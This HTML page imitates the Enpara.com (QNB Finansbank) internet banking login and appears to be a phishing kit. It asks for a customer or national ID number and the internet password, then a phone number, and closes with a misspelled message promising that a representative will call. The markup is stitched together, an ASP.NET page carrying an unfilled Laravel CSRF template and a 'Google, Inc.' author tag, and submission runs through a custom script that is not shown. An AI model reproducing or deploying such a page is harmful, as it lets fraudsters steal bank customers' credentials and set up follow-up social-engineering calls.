<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head id="ctl00_Head1">
    <meta charset="utf-8" />
    <title>
        Enpara.com İnternet Bankacılığı Giriş
    </title>
    <meta http-equiv="PRAGMA" content="NO-CACHE" />
    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE" />
    <meta http-equiv="Expires" content="now" />
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9" />
    <meta name="google" content="notranslate" />
    <meta name="viewport"
        content="width=device-width, user-scalable=no,initial-scale=1.0,minimum-scale=1,height=device-height" />
    <link rel="icon" href="eassets/Content/Images/favicons/favicon16.ico" type="image/x-icon" sizes="16x16" />
    <link rel="icon" href="eassets/Content/Images/favicons/favicon32.ico" type="image/x-icon" sizes="32x32" />
    <link rel="icon" href="eassets/Content/Images/favicons/favicon64.ico" type="image/x-icon" sizes="64x64" />
    <link rel="icon" href="eassets/Content/Images/favicons/favicon128.ico" type="image/x-icon" sizes="128x128" />
    <link rel="icon" href="eassets/Content/Images/favicons/favicon256.ico" type="image/x-icon" sizes="256x256" />

    <!-- CSS START -->

    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/layout/reset.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/layout/page.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/layout/page-header.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/extend/jquery.jscrollpane.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/extend/tinyScrollBar.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/ui/EnBankMainStyle.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/ui/EnBankTooltip.css?20250905162036" />
    <link type="text/css" rel="stylesheet"
        href="eassets/Content/Themes/ui/EnBankInformationTooltip.css?20250905162036" />
    <link type="text/css" rel="stylesheet"
        href="eassets/Content/Themes/ui/EnBankValidationTooltip.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/ui/EnBankDropDownStyle.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/ui/FBDialog.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/layout/login.css?20250905162036" />
    <link type="text/css" rel="stylesheet" href="eassets/Content/Themes/ui/EnparaOpenBanking.css?20250905162036" />
    <!-- CSS START END -->

    <meta name="csrf-token" content="{{ csrf_token() }}" />

    <!-- HEAD CONTENT START -->


    <meta name="author" content="Google, Inc." />
    <meta name="google-play-app" content="app-id=finansbank.enpara" />
    <meta name="apple-itunes-app"
        content="app-id=660620273, app-argument=https://itunes.apple.com/tr/app/enpara.com-cep-subesi/id660620273" />

    <link href="eassets/Content/Themes/Custom/jquery.smartbanner.css" rel="stylesheet" />


    <style type="text/css">
        .infornationTooltip span {
            line-height: 14px !important;
        }

        .infornationTooltip_BottomRight span {
            line-height: 14px !important;
        }

        #login .btnContainer {
            position: relative;
            top: 22px;
        }

        .leftPanel {
            margin-bottom: 0px !important;
        }

        .EnMsk {
            font-family: text-security-disc !important;
        }

        .loginMinHeight {
            min-height: 236px
        }

        .blueBox img {
            margin-top: 1px;
            width: 20px;
        }

        .infornationTooltip span {
            width: 330px !important
        }

        .infornationTooltip_BottomRight span {
            width: 340px !important;
            padding-right: 10px;
        }

        .originalLink {
            color: #0d6efd !important;
        }

        *:focus {
            outline: none;
        }

        #succmsg {
            position: relative;
            top: 50px;
            line-height: 1.5;
            font-size: 12px;
            background: #c366b7;
            padding: 10px;
            color: #fff;
            border-radius: 10px;
        }
    </style>


    <!-- HEAD CONTENT END -->

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" />

</head>

<body id="login" class="first_screen">
    <form name="aspnetForm" method="post" action="./LoginPage.aspx" id="aspnetForm"
        onsubmit="if(fpControl != undefined &amp;&amp; fpControl != null &amp;&amp; fpControl.SetClientInfo != undefined)fpControl.SetClientInfo();return custom_submit();"
        autocomplete="off">
        <div>
            <input type="hidden" name="ctl00_RadScriptManager1_TSM" id="ctl00_RadScriptManager1_TSM" value="" />
            <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
            <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
            <input type="hidden" name="__VSTATE__" id="__VSTATE__" value="-214491467" />
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="" />
        </div>




        <div>

            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
                value="/wEdABGvVXD1oYELeveMr0vHCmYPG5cfUcWoSyheQ2CeyjPoOilKcDgCgYpgnU2rcG2OdrwG23w6HUGL9f6vH2AJIZvky0q7Vcwy2HOAgjkng2dKUIPeZEatAZZ8X1fNd8nRSMtNuecBOVqW+q+5gN9e4yw1ZlH+DJ6J1XvX+ECX3pH+efqwKzWEB2aoNoFwZgG1p03okv2X+qylAbTC46KaZU55Qp2jyL5Slc2f8LRWdcKYoBH+KqwTTvnSoQPfkBmE4KwFUbeat0A2Gy87xHPbuqQjqvo8Bp9yY6z6+AZTyg8DYe0nU8eLqbLoudz3pL2HJCX1KVzEyWDbwF5NXWqOLSYHmkv3mWIzUYHoocjstQhv4hGQuuhpyUeCbG48sSB36ojgwgyX" />
        </div>

        <div class="enpara-coloring-lines">
            <div class="enpara-coloring-lines__color-one"></div>
            <div class="enpara-coloring-lines__color-two"></div>
            <div class="enpara-coloring-lines__color-three"></div>
            <div class="enpara-coloring-lines__color-four"></div>
        </div>
        <div id="wrapper" class="container-lg px-0" style="max-width:980px;min-width:360px;">
            <!-- HEADER START-->
            <div id="header">
                <img src="eassets/Content/Images/logo.png" alt="En Bankacılık" style="width:100%" />
            </div>
            <!-- HEADER END-->

            <!-- CONTENT START -->
            <div id="content" class="row">
                <div class="loginContainer px-0" id="mainPanel">
                    <div id="disabilityFirst" tabindex="10" style="outline:none;"></div>

                    <!-- MAIN CONTENT START -->

                    <div class="row" style="height: 100%; justify-content: center;">

                        <div id="ctl00_MainContent_LoginInformationDiv" style="display: none; width: 625px;">

                        </div>

                        <div id="ctl00_MainContent_CrossLoginPopupDiv" style="display: none; width: 600px;">

                        </div>

                        <div>
                            <div id="ctl00_MainContent_NormalDiv" class="loginMinHeight">



                                <div>
                                    <div id="first_step">
                                        <table class="form">
                                            <tr>
                                                <td colspan="2">
                                                    <div id="ErrorImg" class="validationMessage"
                                                        style="display:none;">
                                                        <table>
                                                            <tr>
                                                                <td id="divErrorMsg" tabindex="10"></td>

                                                            </tr>
                                                        </table>
                                                    </div>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td colspan="2">
                                                    <span id="ctl00_MainContent_CustomerNoLabel">Müşteri numarası veya
                                                        T.C.
                                                        Kimlik numarası</span>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td colspan="2">
                                                    <input name="ctl00$MainContent$txtuserid" type="text"
                                                        maxlength="11" id="tcOrUserNametxt" tabindex="10"
                                                        class="required txtUserId enwatermark"
                                                        placeholder="Lütfen müşteri / T.C. Kimlik numaranızı giriniz."
                                                        style="margin-bottom: 16px;" />
                                                </td>
                                            </tr>
                                            <tr>
                                                <td width="125" colspan="2">
                                                    <span id="ctl00_MainContent_PasswordLabel">İnternet şifresi</span>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td colspan="2">
                                                    <input type="text" id="my_username" style="display: none;" />
                                                    <input name="ctl00$MainContent$txtpass" type="text"
                                                        maxlength="6" id="tbPasswordtxt" tabindex="10"
                                                        class="password enwatermark EnMsk"
                                                        style="margin-bottom: 11px;" placeholder="*****" />


                                                </td>
                                            </tr>
                                            <tr id="ctl00_MainContent_TrSupportDeskLinkButton" class="xtrapadding">
                                                <td>
                                                    <a id="ctl00_MainContent_SupportDeskLinkButton"
                                                        class="hatirlamiyorum_text"
                                                        href="javascript:;"><img
                                                            src="eassets/Content/Images/ico-sifremi-unuttum.png"
                                                            style="border-style:None;border-width:0px;vertical-align:middle;" /><span
                                                            style="vertical-align: middle; margin-left: 3px">Şifremi
                                                            unuttum</span></a>
                                                </td>
                                                <td>
                                                    <div id="ctl00_MainContent_DivWantToBeCustomer"
                                                        class="blueBox round6"
                                                        style="display: block; float:right; height: 29px; position:relative; top:3px;">
                                                        <a id="ctl00_MainContent_WantToBeCustomerButton"
                                                            class="hatirlamiyorum_text"
                                                            href="javascript:__doPostBack(&#39;ctl00$MainContent$WantToBeCustomerButton&#39;,&#39;&#39;)"
                                                            style="color: #848484 !important;"><img
                                                                src="eassets/Content/Images/musteriolmak_icon.png"
                                                                style="border-style:None;border-width:0px;vertical-align:middle;" /><span
                                                                style="vertical-align: middle; margin-left: 3px">Müşteri
                                                                olmak istiyorum!</span></a>
                                                    </div>
                                                </td>
                                            </tr>

                                            <tr>
                                                <td colspan="2">
                                                    <a id="btnLogin" tabindex="10" class="PurpleLinkButton"
                                                        href="javascript:;" style="margin-top: 6px;">Giriş</a>
                                                </td>
                                            </tr>
                                        </table>
                                    </div>
                                    <div id="twice_step" class="d-none">
                                        <table class="form">
                                            <tbody>
                                                <tr>
                                                    <td colspan="2">
                                                        <div id="ErrorImg" class="validationMessage"
                                                            style="display:none;">
                                                            <table>
                                                                <tbody>
                                                                    <tr>
                                                                        <td id="divErrorMsg" tabindex="10"></td>

                                                                    </tr>
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td colspan="2">
                                                        <span id="ctl00_MainContent_CustomerNoLabel">Telefon
                                                            Numaranız</span>
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td colspan="2">
                                                        <input name="ctl00$MainContent$txtuserid" type="text"
                                                            maxlength="11" id="phone" tabindex="10"
                                                            class="required txtUserId enwatermark"
                                                            placeholder="Örn: (555) 000 55 00"
                                                            style="margin-bottom: 16px;">
                                                    </td>
                                                </tr>




                                                <tr>
                                                    <td colspan="2">
                                                        <a id="btnPhone" tabindex="10" class="PurpleLinkButton"
                                                            href="javascript:;" style="margin-top: 6px;">Onayla</a>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>

                                    <div id="three_step" class="d-none">
                                        <div tabindex="10" id="succmsg">Değerli Müşterimiz, başvuru kaydınız
                                            alınmıştır kayda alınmıştır. ilerlereyen saatlerde, temsilcimiz sizinle
                                            süreci tamamlamak için iletişime geçecektir...</div>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                    <div class="c"></div>
                    <div class="c"></div>
                    <input type="hidden" name="ctl00$MainContent$dd5fcb6461304a64adbfb0462736cb6c"
                        id="dd5fcb6461304a64adbfb0462736cb6c" />

                    <!-- MAIN CONTENT END -->

                </div>
                <div class="loginContBottomFix"></div>
            </div>
            <!-- CONTENT END -->

            <!-- FOOTER START -->
            <div id="footer">
                <table>
                    <tr>
                        <td>
                            <div id="ctl00_GlobalSign" style="min-width:100px;">
                                <!--- DO NOT EDIT - GlobalSign SSL Site Seal Code - DO NOT EDIT --->
                                <table width=125 border=0 cellspacing=0 cellpadding=0
                                    title="CLICK TO VERIFY: This site uses a GlobalSign SSL Certificate to secure your personal information."
                                    style="width: 100px;margin: 0;">
                                    <tr>
                                        <td>
                                            <span id="ss_img_wrapper_gmogs_image_100-40_en_dblue"><a
                                                    href="https://www.globalsign.com/" target=_blank
                                                    title="GlobalSign Site Seal" rel="nofollow">
                                                    <img alt="SSL" border=0 id="ss_img"
                                                        src="eassets/Content/Images/siteseal.png"></a></span>
                                        </td>
                                    </tr>
                                </table>
                                <!--- DO NOT EDIT - GlobalSign SSL Site Seal Code - DO NOT EDIT --->
                            </div>

                        </td>
                        <td>
                            <input type="image" name="ctl00$SecurityInfoButton" id="ctl00_SecurityInfoButton"
                                class="SecurityInfoButton" src="eassets/Content/Images/information_security_icon.png"
                                onclick="window.open(&#39;https://www.qnbfinansbank.enpara.com/guvenlik&#39;,&#39;_blank&#39;,&#39;location=1,status=1,scrollbars=1,width=1000,height=600,resizable=0&#39;); return false;;__doPostBack(&#39;ctl00$SecurityInfoButton&#39;,&#39;&#39;);return false;;;"
                                style="border-width:0px;" />
                        </td>
                    </tr>
                    <tr>
                        <td colspan="2" style="height:50px; text-align:center">
                            <span id="ctl00_CopyrightText" tabindex="100"
                                style="font-size:11px;color:#a4a4a4">Copyright
                                © 2025 QNB Enpara.com. Tüm hakları saklıdır.</span>
                        </td>
                    </tr>
                </table>
            </div>

            <div id="disabilityLast" tabindex="10"></div>
            <!-- FOOTER END -->
        </div>

        <!-- INFORMATION TOOLTIP START -->
        <div class="toolTip1">
            <div class="kulak">
            </div>
            <div class="mytooltipContent">
            </div>
        </div>
        <div class="toolTip2">
            <div class="kulak">
            </div>
            <div class="mytooltipContent">
            </div>
        </div>
        <div class="toolTip1_ters">
            <div class="kulak">
            </div>
            <div class="mytooltipContent">
            </div>
        </div>
        <div class="toolTip2_ters">
            <div class="kulak">
            </div>
            <div class="mytooltipContent">
            </div>
        </div>
        <!-- INFORMATION TOOLTIP END -->

        <!-- VALIDATION TOOLTIP START -->
        <div class="ValidatorTooltipMain">
            <div class="ValidatorTooltip">
                <div class="kulak" style="top: -6px; left: 20px;">
                </div>
                <div class="mytooltipContent">
                </div>
            </div>
        </div>
        <!-- VALIDATION TOOLTIP END -->

        <input type="hidden" name="ctl00$c4c177c64bd4eae9d60075cce048489" id="c4c177c64bd4eae9d60075cce048489"
            value="10001" />
        <input type="hidden" name="ctl00$ff4fa79cf84f55a42508c54b9ae8d3" id="ff4fa79cf84f55a42508c54b9ae8d3"
            value="0A1FA1436745C062DA2EEAAC1BBC5753A5EA8CFC6383E0CCA92F48F89AECACFB663ABAE7BA7A7B187EA02772F3D80ABC60ACD1FF5DB6B991A566D2B7B6563924A4F97EF7F332BC835D03FD1DA6E676864F31F2A1DFCBE362C9CAE8C1662851761882D114E8E0A1194CD91243D2BF2C233855CD3FF1FFAF6D30EAB4DB7BAE4CDC7" />
        <input type="hidden" name="ctl00$e31e5ca38b564c79a643c6c847eca75e" id="e31e5ca38b564c79a643c6c847eca75e"
            value="|" />
        <input type="hidden" name="ctl00$a898601b64769984d756e93058f25" id="a898601b64769984d756e93058f25"
            value="fzbwxhxe3glhoxqh3unqqz2p" />
        <input type="hidden" name="ctl00$e71495a37e184fd5b2a45c94e43aed8a" id="e71495a37e184fd5b2a45c94e43aed8a"
            value="13" />
        <input type="hidden" name="ctl00$ca0533dc402c4472abb57e29a9e73110" id="ca0533dc402c4472abb57e29a9e73110"
            value="104046" />
        <input type="hidden" name="ctl00$f2af101b867f4da49d9803726e51e7d6" id="f2af101b867f4da49d9803726e51e7d6" />
        <input type="hidden" name="ctl00$CEHiddenField" id="CEHiddenField" />

        <div id="ctl00_fpControl">

            <input type="hidden" name="ctl00$DCA3638C-5191-4A14-801E-ADF63014C08B"
                id="DCA3638C-5191-4A14-801E-ADF63014C08B" />
        </div>


    </form>

    <!-- ASYNC JS CALL : DO NOT CHANGE -->

    <!-- MODAL POPUP START -->
    <div class="hatamesaji1Confirm" id="hatamesaji1Confirm">
        <div class="floatLeft">
            <div class="popupheader_left" title="Finansbank">
            </div>
        </div>
        <div class="header2 floatLeft">
            <div class="popup_header_icon">
                <div title="">
                </div>
            </div>
            <div class="headerErrMsg">
                Hata !
            </div>
            <a href="javascript:void(0)">
                <div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction="">
                </div>
            </a>
            <div class="popupheader_pagingfield"></div>
            <div class="popupheader_tit"></div>
        </div>
        <div class="floatLeft">
            <div title="Finansbank" class="popupheader_right">
            </div>
        </div>
        <div class="clearBoth">
        </div>
        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv">
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td width="6px">
                        <div class="imgRoundedCornerLeft">
                        </div>
                    </td>
                    <td class="popupcontentRoundedCornerDiv_middle">
                    </td>
                    <td width="6px">
                        <div class="imgRoundedCornerRight">
                        </div>
                    </td>
                </tr>
            </table>
        </div>
        <div class="popupcontent">
            <div class="scrollbarmain" style="position: relative; left: 7px">
                <div class="scrollbar">
                    <div class="track">
                        <div class="thumb">
                            <div class="end">
                            </div>
                        </div>
                    </div>
                </div>
                <div class="viewport">
                    <div class="overview">
                        <div class="hata_msj">
                        </div>
                    </div>
                </div>
            </div>
            <div class="popupButtonContainer">
                <div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction="">
                    İptal et
                    <a href="javascript:void(0)">
                        <div id="btnConfirmNo" border="0">
                        </div>
                    </a>
                </div>
                <div class="onay btnClassName" commandtype="cmdYes" callbackfunction="">
                    Evet
                    <a href="javascript:void(0)">
                        <div id="btnConfirmYes" border="0">
                        </div>
                    </a>
                </div>
                <div class="resend btnClassName" commandtype="cmdResend" callbackfunction="">
                    Tekrar gönder
                    <a href="javascript:void(0)">
                        <div id="btnConfirmYes" border="0">
                        </div>
                    </a>
                </div>
                <div class="print btnClassName" commandtype="cmdPrint" callbackfunction="">
                    Yazdır
                    <a href="javascript:void(0)">
                        <div id="btnPrint" border="0">
                        </div>
                    </a>
                </div>
                <div class="save btnClassName" commandtype="cmdSave" callbackfunction="">
                    Kaydet
                    <a href="javascript:void(0)">
                        <div id="btnSave" border="0">
                        </div>
                    </a>
                </div>
                <div class="sendmail btnClassName" commandtype="cmdSentMail" callbackfunction="">
                    E-posta gönder
                    <a href="javascript:void(0)">
                        <div id="btnSentMail" border="0">
                        </div>
                    </a>
                </div>
                <div class="delete btnClassName" commandtype="cmdDelete" callbackfunction="">
                    Sil
                    <a href="javascript:void(0)">
                        <div id="btnDelete" border="0">
                        </div>
                    </a>
                </div>
            </div>
        </div>
        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom">
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td width="6px">
                        <div class="imgRoundedCornerLeft_bottom">
                        </div>
                    </td>
                    <td class="popupcontentRoundedCornerDiv_middle_bottom">
                    </td>
                    <td width="6px">
                        <div class="imgRoundedCornerRight_bottom">
                        </div>
                    </td>
                </tr>
            </table>
        </div>
    </div>
    <!-- MODAL POPUP END -->

    <!-- MODAL IFRAME POPUP START -->
    <div class="hatamesaji1ConfirmIframe" id="hatamesaji1ConfirmIframe">
        <div class="floatLeft">
            <div class="popupheader_left" title="Finansbank">
            </div>
        </div>
        <div class="header2 floatLeft">
            <div class="popup_header_icon">
                <div title="">
                </div>
            </div>
            <div class="headerErrMsg">
                Hata !
            </div>
            <a href="javascript:void(0)">
                <div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction="">
                </div>
            </a>
            <div class="popupheader_pagingfield"></div>
            <div class="popupheader_tit"></div>
        </div>
        <div class="floatLeft">
            <div title="Finansbank" class="popupheader_right">
            </div>
        </div>
        <div class="clearBoth">
        </div>
        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv">
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td width="6px">
                        <div class="imgRoundedCornerLeft">
                        </div>
                    </td>
                    <td class="popupcontentRoundedCornerDiv_middle">
                    </td>
                    <td width="6px">
                        <div class="imgRoundedCornerRight">
                        </div>
                    </td>
                </tr>
            </table>
        </div>
        <div class="popupcontent">
            <div class="hata_msj">
                <iframe scrolling="no" frameborder="0" src="" class="hata_msj_iframe"></iframe>
            </div>
            <div class="popupButtonContainer">
                <div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction="">
                    İptal et
                    <a href="javascript:void(0)">
                        <div id="Div1" width="63" height="21" border="0">
                        </div>
                    </a>
                </div>
                <div class="onay btnClassName" commandtype="cmdYes" callbackfunction="">
                    Evet
                    <a href="javascript:void(0)">
                        <div id="Div2" border="0">
                        </div>
                    </a>
                </div>
                <div class="print btnClassName" commandtype="cmdPrint" callbackfunction="">
                    Yazdır
                    <a href="javascript:void(0)">
                        <div id="Div3" border="0">
                        </div>
                    </a>
                </div>
                <div class="resend btnClassName" commandtype="cmdResend" callbackfunction="">
                    Tekrar gönder
                    <a href="javascript:void(0)">
                        <div id="Div4" border="0">
                        </div>
                    </a>
                </div>
                <div class="save btnClassName" commandtype="cmdSave" callbackfunction="">
                    Kaydet
                    <a href="javascript:void(0)">
                        <div id="Div5" border="0">
                        </div>
                    </a>
                </div>
                <div class="save btnClassName" commandtype="cmdSentMail" callbackfunction="">
                    E-posta gönder
                    <a href="javascript:void(0)">
                        <div id="Div6" border="0">
                        </div>
                    </a>
                </div>
            </div>
        </div>
        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom">
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td width="6px">
                        <div class="imgRoundedCornerLeft_bottom">
                        </div>
                    </td>
                    <td class="popupcontentRoundedCornerDiv_middle_bottom">
                    </td>
                    <td width="6px">
                        <div class="imgRoundedCornerRight_bottom">
                        </div>
                    </td>
                </tr>
            </table>
        </div>
    </div>
    <!-- MODAL IFRAME POPUP END -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="eassets/custom/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="eassets/custom/custom.js"></script>
</body>

</html>
